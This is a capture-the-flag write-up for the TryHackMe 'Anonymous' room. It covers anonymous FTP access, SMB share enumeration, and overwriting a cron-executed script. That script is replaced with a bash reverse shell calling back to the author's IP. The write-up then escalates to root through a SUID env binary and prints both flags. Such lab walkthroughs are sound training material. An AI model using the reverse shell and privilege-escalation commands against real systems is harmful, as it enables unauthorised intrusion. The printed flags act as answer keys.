# Tryhackme.com Room : Anonymous
`https://tryhackme.com/room/anonymous`


# Instance
```
export IP=10.10.28.92
```

# Nmap
```
```

We login to the `ftp` using `anonymous` login.
We find 3 files :
`cat clean.sh` :
```bash
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```

`cat removed_files.log` :
```
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
```

`cat to_do.txt` :
```
I really need to disable the anonymous login...it's really not safe
```

Seems like we can upload files but it's really slow. Look like there is a sleep delay somewhere to discourage us (I guess ?)
It looks like `clean.sh` is executed via a `cronjob`.
let's upload a reverse shell in place of `clean.sh`

```bash
#!/bin/bash

bash -i >& /dev/tcp/10.6.32.20/7777 0>&1
```

While it's uploading, I've ran nmap on all ports and found these other ports opened :
```
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
```

We retrieve the shares using `smbmap -H 10.10.28.92` :
```
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        pics                                                    READ ONLY       My SMB Share Directory for Pics
        IPC$                                                    NO ACCESS       IPC Service (anonymous server (Samba, Ubuntu))  
```

In this share we find 2 `jpg` files. not sure what to do with those, tried to run `stegcracker` but found nothing.

Back to the ftp.
our `clean.sh` is not executed, probably because it doesn't have execution permissions.
We can't run `chmod +x clean.sh` from the `ftp` command line. We get a permission denied.

To work around this, I first uploaded a file containing the reverse shell and then I used `append shell.sh clean.sh` so that the shell was appended to the file with the correct permissions.

An we are now in as `namelessone`.

we find `/home/namelessone/user.txt` :
```
90d6f992585815ff991e68748c414740
```

## Priv Esc

We try `sudo -l` but we don't have the password for `namelessone`.
Looked around a bit, didn't find interesting stuff so I ran `linpeas` and found that `/usr/bin/env` had `SUID` bit set.
Getting a root shell was as simple as 
```
env /bin/sh -p
```

And we are `root`. Now we can retrieve the flag `/root/root.txt`
```
4d930091c31a622a7ed10f27999af363
```

## Wrap up
* Learned about the `append` ftp command. Usefull when you want to upload a script but can't change permissions on a file.
** Not sure why this was needed tho... The cron job should call /bin/sh -c '/var/ftp/scripts/clean.sh'. Weird that it didn't work when I replaced the whole file.
* The `env` binary could have been found using `find / -perm -4000 2>/dev/null`. Linpeas was not needed here..
* Seems like there was another way to exploit this box by uploading a malicious `lxc` container. (`https://reboare.github.io/lxd/lxd-escape.html`)